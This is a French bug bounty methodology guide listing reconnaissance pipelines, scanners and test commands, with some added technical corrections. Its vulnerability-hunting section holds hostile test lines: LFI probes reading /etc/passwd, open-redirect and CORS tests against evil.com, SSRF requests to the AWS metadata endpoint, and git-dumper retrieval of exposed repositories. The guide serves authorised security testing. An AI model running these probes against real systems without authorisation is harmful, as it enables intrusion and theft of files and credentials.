# 🐛 Méthodologie de recherche en bug bounty

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗
  ██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝
  ██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝ 
  ██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝  
  ██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║   
  ╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝   
            Complete Bug Bounty Hunting Methodology
```

<p align="center">
  <img src="https://img.shields.io/badge/Bug_Bounty-Methodology-red?style=for-the-badge" alt="Bug Bounty">
  <img src="https://img.shields.io/badge/Recon-blue?style=for-the-badge" alt="Recon">
  <img src="https://img.shields.io/badge/Vulnerability-green?style=for-the-badge" alt="Vuln">
</p>

---

> **Repères de lecture :** les pipelines et chemins de modèles reprennent les versions du document source ; les options, services d’API et formats de sortie peuvent évoluer. Les noms de fichiers d’entrée ne sont pas toujours cohérents entre les étapes, et certaines étapes supposent des outils ou fichiers préparés séparément. Une sortie d’outil ou un rapprochement ASN/certificat fournit une piste, pas une preuve de vulnérabilité, de propriété ou d’appartenance au périmètre. Le dessin ASCII conserve le texte source.
>
> **Subfinder :** `-recursive` sélectionne les sources capables de traiter récursivement les sous-domaines ; cette option ne signifie pas à elle seule une recherche active récursive. L’accès à certaines sources requiert leur configuration. Voir l’[aide officielle de Subfinder](https://github.com/projectdiscovery/subfinder#usage).

## 🗺️ Vue d’ensemble du déroulement des tests

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                      BUG BOUNTY HUNTING METHODOLOGY                         │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  PHASE 1: Subdomain Enum    PHASE 2: ASN & IP        PHASE 3: Live Hosts   │
│  ├── Subfinder              ├── ASN Mapping          ├── HTTPX Probing     │
│  ├── Amass                  ├── IP Harvesting        ├── Port Discovery    │
│  ├── crt.sh                 └── Shodan               └── Aquatone          │
│  └── Wayback                                                                │
│                                                                             │
│  PHASE 4: URL Collection    PHASE 5: Vuln Hunting    PHASE 6: Deep Dive    │
│  ├── Katana/Hakrawler       ├── XSS Testing          ├── Directory Brute   │
│  ├── GAU                    ├── LFI/RFI              ├── Parameter Fuzzing │
│  └── Parameter Extract      ├── SSRF/CORS            └── Git Exposure      │
│                             └── Open Redirect                               │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 📋 Table des matières

1. [Phase 1 : Énumération des sous-domaines](#-phase-1--énumération-des-sous-domaines)
2. [Phase 2 : Découverte des ASN et des IP](#-phase-2--découverte-des-asn-et-des-ip)
3. [Phase 3 : Découverte des hôtes actifs](#-phase-3--découverte-des-hôtes-actifs)
4. [Phase 4 : Collecte d’URL](#-phase-4--collecte-durl)
5. [Phase 5 : Recherche de vulnérabilités](#-phase-5--recherche-de-vulnérabilités)
6. [Phase 6 : Découverte de répertoires et de fichiers](#-phase-6--découverte-de-répertoires-et-de-fichiers)
7. [Référence rapide](#-référence-rapide)
8. [Installation des outils](#-installation-des-outils)

---

## 🔍 Phase 1 : Énumération des sous-domaines

> **Objectif :** trouver le plus de sous-domaines possible. Une surface d’attaque plus étendue peut offrir davantage de possibilités de recherche de vulnérabilités.

### Outils d’énumération automatisée

#### Subfinder
```bash
# Découverte rapide de sous-domaines à partir de plusieurs sources de données
subfinder -d example.com -all -recursive -o subfinder.txt

# Explication des options :
# -all : utiliser toutes les sources (gratuites et payantes)
# -recursive : énumération récursive des sous-domaines (libellé source ; voir la précision)
# -o : fichier de sortie
```
> 💡 **Conseil :** Subfinder est rapide et fiable. Utilisez `-all` pour élargir les résultats.

#### Assetfinder
```bash
# Rechercher les domaines et sous-domaines associés à une cible
assetfinder --subs-only example.com > assetfinder.txt

# Rapide et simple, utile pour une première reconnaissance
```
> 💡 **Conseil :** Assetfinder est rapide, mais moins exhaustif. Utilisez-le en complément d’autres outils.

#### Sublist3r
```bash
# Énumération de sous-domaines à l’aide de techniques OSINT
sublist3r -d example.com -e baidu,yahoo,google,bing,ask,netcraft,virustotal,threatcrowd,crtsh,passivedns -v -o sublist3r.txt

# -e : préciser les moteurs de recherche
# -v : sortie détaillée
```

#### Amass
```bash
# Cartographie approfondie de la surface d’attaque
amass enum -passive -d example.com | cut -d']' -f 2 | awk '{print $1}' | sort -u > amass.txt

# Mode passif : sans interaction directe avec la cible
# Utiliser -active pour davantage de résultats, avec plus de trafic
```
> ⚠️ **Attention :** Amass en mode actif peut produire beaucoup de trafic. Commencez par le mode passif.

### Sources publiques

#### Transparence des certificats (crt.sh)
```bash
# Rechercher les sous-domaines dans les journaux de certificats SSL
curl -s https://crt.sh\?q\=\example.com\&output\=json | jq -r '.[].name_value' | grep -Po '(\w+\.\w+\.\w+)$' > crtsh.txt
```
> 💡 **Pourquoi crt.sh ?** Les certificats SSL figurent dans des journaux publics : une source gratuite d’informations sur les sous-domaines.

#### Wayback Machine
```bash
# Rechercher des sous-domaines historiques dans les archives du Web
curl -s "http://web.archive.org/cdx/search/cdx?url=*.example.com/*&output=text&fl=original&collapse=urlkey" | sort | sed -e 's_https*://__' -e "s/\/.*//" -e 's/:.*//' -e 's/^www\.//' | sort -u > wayback.txt
```
> 💡 **Conseil pratique :** d’anciens sous-domaines peuvent encore exister tout en ayant été oubliés ; ils peuvent révéler des pistes intéressantes.

### Traitement des sous-domaines

#### Fusionner les résultats et supprimer les doublons
```bash
# Regrouper les fichiers de sous-domaines et supprimer les doublons
cat *.txt | sort -u > final_subdomains.txt

# Compter les résultats
wc -l final_subdomains.txt
```

#### Recherche de sous-domaines par force brute avec FFUF
```bash
# Rechercher des sous-domaines par force brute à partir de listes de mots
ffuf -u "https://FUZZ.example.com" -w wordlist.txt -mc 200,301,302

# -mc : retenir uniquement certains codes de statut
# Liste de mots suggérée : /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

#### Permutations de sous-domaines avec Alterx
```bash
# Générer des permutations de sous-domaines et les résoudre
subfinder -d example.com | alterx | dnsx

# Enrichir le domaine avec des motifs courants
echo example.com | alterx -enrich | dnsx

# Utiliser une liste de mots pour les permutations
echo example.com | alterx -pp word=/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt | dnsx
```
> 💡 **Exemple :** à partir de `dev.example.com`, alterx peut générer `dev1`, `dev2`, `dev-api`, etc.

---

## 🌐 Phase 2 : Découverte des ASN et des IP

> **Objectif :** trouver les plages IP et les infrastructures associées à l’organisation cible.

### Cartographie des ASN

```bash
# Découvrir les adresses IP associées à l’ASN du domaine
asnmap -d example.com | dnsx -silent -resp-only

# Découvrir des actifs à partir du nom de l’organisation
amass intel -org "organization_name"

# Découvrir des actifs dans une plage IP
amass intel -active -cidr 159.69.129.82/32

# Découvrir des actifs à partir d’un numéro d’ASN
amass intel -active -asn [asnno]
```
> 💡 **Pourquoi les ASN ?** Les organisations peuvent détenir des plages IP entières : elles peuvent ainsi révéler des serveurs peu visibles.

### Collecte d’adresses IP

#### VirusTotal
```bash
# Extraire les adresses IP de VirusTotal
curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=example.com&apikey=[api-key]" | jq -r '.. | .ip_address? // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
```

#### AlienVault OTX
```bash
# Obtenir les adresses IP depuis AlienVault Open Threat Exchange
curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/example.com/url_list?limit=500&page=1" | jq -r '.url_list[]?.result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
```

#### URLScan.io
```bash
# Extraire les adresses IP de URLScan.io
curl -s "https://urlscan.io/api/v1/search/?q=domain:example.com&size=10000" | jq -r '.results[]?.page?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
```

#### Recherche SSL avec Shodan
```bash
# Rechercher des adresses IP à partir des certificats SSL dans Shodan
shodan search Ssl.cert.subject.CN:"example.com" 200 --fields ip_str | httpx -sc -title -server -td
```
> 💡 **Conseil pratique :** la recherche SSL de Shodan peut retrouver des serveurs utilisant le certificat SSL de la cible, y compris des serveurs peu visibles.

---

## ✅ Phase 3 : Découverte des hôtes actifs

> **Objectif :** filtrer les sous-domaines pour ne conserver que les hôtes actifs et accessibles.

### Vérification HTTP avec HTTPX

```bash
# Vérification élémentaire sur plusieurs ports
cat subdomain.txt | httpx -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt

# Vérification détaillée : codes de statut, titres et détection des technologies
cat subdomain.txt | httpx -sc -title -server -td -ports 80,443,8080,8000,8888 -threads 200

# Options :
# -sc : code de statut
# -title : titre de la page
# -server : en-tête Server
# -td : détection des technologies
```

### Reconnaissance visuelle avec Aquatone

```bash
# Prendre des captures d’écran des hôtes actifs
cat hosts.txt | aquatone

# Ports personnalisés
cat hosts.txt | aquatone -ports 80,443,8000,8080,8443

# Ensemble étendu de ports pour une couverture plus large
cat hosts.txt | aquatone -ports 80,81,443,591,2082,2087,2095,2096,3000,8000,8001,8008,8080,8083,8443,8834,8888
```
> 💡 **Pourquoi les captures d’écran ?** Elles permettent de repérer rapidement les applications intéressantes, les interfaces de connexion et les pages d’erreur.

---

## 🔗 Phase 4 : Collecte d’URL

> **Objectif :** recueillir le plus d’URL possible pour tester les paramètres et rechercher des vulnérabilités.

### Exploration active

#### Katana
```bash
# Robot d’exploration rapide pour découvrir des URL
katana -u livesubdomains.txt -d 2 -o urls.txt

# -d 2 : profondeur de deux niveaux
# Rapide et efficace pour les applications web modernes
```

#### Hakrawler
```bash
# Robot d’exploration simple et rapide
cat urls.txt | hakrawler -u > crawled_urls.txt
```

### Collecte passive d’URL

#### GAU (Get All URLs)
```bash
# Récupérer les URL connues d’AlienVault OTX, de Wayback Machine et de Common Crawl
cat livesubdomains.txt | gau | sort -u > passive_urls.txt

# Récupérer les URL associées au statut 200 et supprimer les doublons
echo example.com | gau --mc 200 | urldedupe > urls.txt
```
> 💡 **Pourquoi GAU ?** Les données historiques peuvent révéler des points de terminaison peu visibles.

#### URLFinder
```bash
# Rechercher des URL dans plusieurs sources
urlfinder -d example.com | sort -u > urlfinder_urls.txt
```

### Extraction des paramètres

```bash
# Extraire les URL contenant des paramètres, utiles pour les tests
cat allurls.txt | grep '=' | urldedupe | tee params_urls.txt

# Rechercher des motifs de paramètres
cat allurls.txt | grep -E '\?[^=]+=.+$' | tee params_urls.txt

# Motif GF SQLi : URL pouvant présenter une injection SQL
cat allurls.txt | gf sqli

# Motif GF XSS
cat allurls.txt | gf xss

# Motif GF LFI
cat allurls.txt | gf lfi
```
> 💡 **Motifs GF :** installez `gf` et récupérez les motifs sur github.com/1ndianl33t/Gf-Patterns.

---

## 🔓 Phase 5 : Recherche de vulnérabilités

### 🔴 Recherche de XSS

> **Précision :** le pipeline de XSS réfléchie ci-dessous collecte et filtre des URL candidates ; il n’injecte pas de charge utile et ne confirme pas, à lui seul, une XSS. Les correspondances `gf`, codes HTTP et motifs de texte servent au tri et demandent une vérification.

#### Tests de XSS réfléchie
```bash
# Chaîne de traitement pour rechercher des XSS réfléchies
subfinder -d "example.com" -all -recursive | \
httpx -mc 200 -silent | \
sed -E 's,https?://(www\.)?,,' | anew | \
urlfinder -all | \
iconv -f ISO-8859-1 -t UTF-8 -c | \
grep -aE '\?.*=.*(&.*)?' | \
grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|jpeg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | \
awk -F'[?&=]' '!seen[$1$2]++' | anew
```

#### Tests de XSS aveugle
```bash
# Tests de XSS aveugle avec des charges utiles spécialisées
# Utiliser des services tels que XSS Hunter ou Burp Collaborator
# Insérer la charge utile dans les champs de saisie, les en-têtes et les paramètres
```
> 💡 **XSS aveugle :** les charges utiles peuvent s’exécuter ultérieurement lorsqu’un administrateur consulte les données ; les serveurs de rappel permettent d’observer cette exécution.

### 🔴 Recherche de LFI

```bash
# Tester les LFI avec FFUF en recherchant le contenu du fichier passwd
echo "https://example.com/" | gau | gf lfi | uro | \
sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | \
xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v

# Tester les LFI avec curl et un traitement parallèle
gau example.com | gf lfi | qsreplace "/etc/passwd" | \
xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

# Test de LFI avec HTTPx
echo 'https://example.com/index.php?page=' | \
httpx -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\*|\$[^\:]*):0:0:"
```
> 💡 **Conseil LFI :** essayer `/etc/passwd`, `....//....//etc/passwd` et des variantes encodées.

### 🔴 Recherche de redirections ouvertes

```bash
# Rechercher les paramètres de redirection
cat urls.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|next=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_url=|rurl=|target=|to=|url=" | tee redirect_params.txt

# Motif GF pour les redirections
cat urls.txt | gf redirect | uro | sort -u | tee redirect_params.txt

# Tester les paramètres de redirection
cat redirect_params.txt | qsreplace "https://evil.com" | httpx -silent -fr -mr "evil.com"

# Chaîne complète de recherche de redirections ouvertes
subfinder -d example.com -all | httpx -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx -silent -fr -mr "evil.com"
```

### 🔴 Recherche de SSRF

```bash
# Rechercher les paramètres pouvant être exposés à une SSRF
cat urls.txt | grep -E 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue=' | sort -u

# Rechercher les motifs associés aux API et webhooks
cat urls.txt | grep -i 'webhook\|callback\|upload\|fetch\|import\|api' | sort -u

# Recherche de SSRF avec Nuclei
cat urls.txt | nuclei -t nuclei-templates/vulnerabilities/ssrf/

# Test élémentaire de SSRF vers localhost
curl "https://example.com/page?url=http://127.0.0.1:80/"

# SSRF vers les métadonnées cloud (AWS)
curl "https://example.com/api?endpoint=http://169.254.169.254/latest/meta-data/"
```
> ⚠️ **Conséquences d’une SSRF :** elle peut permettre d’accéder à des services internes, à des métadonnées cloud et à d’autres ressources.

> **Précision AWS :** l’exemple de lecture directe des métadonnées suppose que l’accès sans jeton soit autorisé. IMDSv2 exige un jeton de session ; ce GET seul n’est pas suffisant lorsque cette version est imposée. Voir la [documentation officielle EC2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html).

### 🔴 Tests CORS

```bash
# Tester la configuration CORS avec une origine personnalisée
curl -H "Origin: http://evil.com" -I https://example.com/api/

# Analyse détaillée de CORS
curl -H "Origin: http://evil.com" -I https://example.com/api/ | \
grep -i -e "access-control-allow-origin" -e "access-control-allow-methods" -e "access-control-allow-credentials"

# Recherche automatisée de configurations CORS avec Nuclei
cat subdomains.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt
```
> 💡 **Vulnérabilité CORS :** le document source classe l’association `Access-Control-Allow-Origin: *` avec des identifiants comme critique ; voir la correction ci-dessous.

> **Correction :** avec une requête CORS incluant des identifiants, le navigateur bloque l’accès à une réponse qui utilise `Access-Control-Allow-Origin: *`. Cette seule combinaison n’établit donc pas une vulnérabilité critique. L’exploitabilité et la gravité dépendent notamment de la politique d’origine effectivement appliquée et des données accessibles. Voir la [documentation MDN sur CORS et les identifiants](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS/Errors/CORSNotSupportingCredentials).


### Recherche de vulnérabilités avec Nuclei

```bash
# Une seule cible
nuclei -u https://example.com -bs 50 -c 30

# Plusieurs cibles
nuclei -l live_domains.txt -bs 50 -c 30

# Uniquement les gravités critique et élevée
nuclei -l live_domains.txt -s critical,high -bs 50 -c 30

# -bs : taille des lots
# -c : nombre de tâches simultanées
```

---

## 📂 Phase 6 : Découverte de répertoires et de fichiers

### Découverte de fichiers sensibles

```bash
# Extensions courantes de fichiers sensibles
cat allurls.txt | grep -E "\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5"

# Expression régulière étendue pour les fichiers sensibles
cat allurls.txt | grep -E "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"

# Requête Google Dork pour les fichiers
# site:*.example.com (ext:doc OR ext:docx OR ext:pdf OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:sql OR ext:bak OR ext:conf OR ext:log)
```

### Recherche de répertoires par force brute

#### Dirsearch
```bash
# Découverte élémentaire de répertoires
dirsearch -u https://example.com --full-url --deep-recursive -r

# Recherche étendue avec plusieurs extensions
dirsearch -u https://example.com -e php,cgi,htm,html,js,txt,bak,zip,old,conf,log,asp,aspx,jsp,sql,json,xml,yml,yaml,py,rb --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects
```

#### Découverte de répertoires avec FFUF
```bash
# Recherche étendue de répertoires par force brute avec FFUF
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt \
-u https://example.com/FUZZ \
-fc 400,401,402,403,404,429,500,501,502,503 \
-recursion -recursion-depth 2 \
-e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env \
-ac -c \
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" \
-t 10
```

### Détection de dépôts Git exposés

```bash
# Détecter les répertoires .git exposés
cat domains.txt | httpx -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe

# Vérifier la présence de .git/config
curl -s https://example.com/.git/config

# Récupérer le dépôt Git s’il est exposé
git-dumper https://example.com/.git/ output/
```
> ⚠️ **Dépôt Git exposé :** le code source, des identifiants et des secrets peuvent devenir accessibles.

### Découverte de paramètres cachés avec Arjun

```bash
# Découverte passive de paramètres
arjun -u https://example.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"

# Découverte active de paramètres avec une liste de mots
arjun -u https://example.com/endpoint.php -oT arjun_output.txt -m GET,POST \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-t 10 --rate-limit 10 --headers "User-Agent: Mozilla/5.0"
```

### Prise de contrôle de sous-domaines

```bash
# Détection automatisée de possibilités de prise de contrôle de sous-domaines
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
```
> 💡 **Indices de prise de contrôle :** un CNAME pointant vers un service non revendiqué, par exemple S3 ou Heroku.

### Tests WordPress

```bash
# Analyse de sécurité complète de WordPress
wpscan --url https://example.com --disable-tls-checks --api-token YOUR_API_TOKEN \
-e at -e ap -e u --enumerate ap --plugins-detection aggressive --force

# -e at : tous les thèmes
# -e ap : toutes les extensions
# -e u : utilisateurs
```

---

## 📊 Référence rapide

### Chaîne de reconnaissance

```bash
# 1. Énumération des sous-domaines
subfinder -d example.com -all -recursive -o subs.txt
amass enum -passive -d example.com >> subs.txt
cat subs.txt | sort -u > all_subs.txt

# 2. Découverte des hôtes actifs
cat all_subs.txt | httpx -ports 80,443,8080,8000 -threads 200 > alive.txt

# 3. Collecte d’URL
cat alive.txt | gau | sort -u > urls.txt
cat alive.txt | katana -d 2 >> urls.txt

# 4. URL contenant des paramètres
cat urls.txt | grep '=' | urldedupe > params.txt

# 5. Recherche de vulnérabilités
nuclei -l alive.txt -s critical,high -o nuclei_results.txt
```

### Commandes essentielles en une ligne

| Utilité | Commande |
|---------|---------|
| Rechercher des sous-domaines | `subfinder -d target.com -silent` |
| Vérifier les hôtes actifs | `cat subs.txt \| httpx -silent` |
| Obtenir toutes les URL | `echo target.com \| gau` |
| Rechercher les paramètres | `cat urls.txt \| grep '='` |
| Tester les redirections | `cat urls.txt \| gf redirect` |
| Analyse Nuclei | `nuclei -l hosts.txt -s critical,high` |

### Extensions de fichiers à rechercher

| Type | Extensions |
|------|------------|
| **Configuration** | `.env, .config, .conf, .ini, .yml, .yaml` |
| **Sauvegarde** | `.bak, .old, .backup, .zip, .tar.gz` |
| **Code source** | `.php, .asp, .aspx, .jsp, .py, .rb` |
| **Données** | `.sql, .db, .sqlite, .json, .xml` |
| **Documents** | `.pdf, .doc, .docx, .xls, .xlsx` |

---

<a id="-installation-des-outils"></a>
## 🛠️ Installation des outils

### Outils essentiels

```bash
# Subfinder
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# HTTPX
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest

# Nuclei
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Katana
go install github.com/projectdiscovery/katana/cmd/katana@latest

# GAU
go install github.com/lc/gau/v2/cmd/gau@latest

# FFUF
go install github.com/ffuf/ffuf/v2@latest

# Amass
go install -v github.com/owasp-amass/amass/v4/...@master

# Assetfinder
go install github.com/tomnomnom/assetfinder@latest
```

### Outils XSS et de redirection

```bash
# OR (outil de test des redirections ouvertes)
go install -v github.com/h6nt3r/or@latest

# RC (XSS réfléchie)
go install -v github.com/h6nt3r/rc@latest

# CXSS (scanner de XSS contextuelles)
go install github.com/haxshadow/cxss@latest

# XSSER
go install -v github.com/h6nt3r/xsser@latest

# GF (motifs de recherche grep)
go install github.com/tomnomnom/gf@latest
```

### Outils utilitaires

```bash
# URO (suppression des doublons d’URL)
pip3 install uro

# Arjun (découverte de paramètres)
pip3 install arjun

# Subzy (détection de prises de contrôle)
go install -v github.com/PentestPad/subzy@latest
```

---

## 🎯 Conseils pour le bug bounty

1. **Automatiser, puis vérifier manuellement** — Les outils trouvent des pistes ; vous confirmez les vulnérabilités.
2. **Consulter robots.txt et sitemap.xml** — Ils révèlent parfois des chemins peu visibles.
3. **Examiner les fichiers JavaScript** — Points de terminaison d’API, secrets et identifiants codés en dur.
4. **Tester tous les paramètres** — Y compris ceux qui sont cachés, avec Arjun par exemple.
5. **Enchaîner les vulnérabilités** — Une combinaison SSRF et XSS peut accroître les conséquences.
6. **Soigner le rapport** — PoC clair, conséquences et étapes de reproduction.
7. **Faire preuve de patience** — Trouver une vulnérabilité pertinente peut prendre du temps.

---

## 📚 Fiches connexes

- [Nuclei](../../Nuclei/README.md)
- [ffuf](../../ffuf/README.md)
- [Subfinder](../../Subfinder/README.md)
- [httpx](../../httpx/README.md)
- [Google Dorking](../../Google-Dorking/README.md)
- [Burp Suite](../../Burp-Suite/translations/README.fr.md)

---

<p align="center">
  <b>🐛 Bonne recherche !</b><br>
  <i>Bug bounty — Quand la persévérance mène aux récompenses</i>
</p>
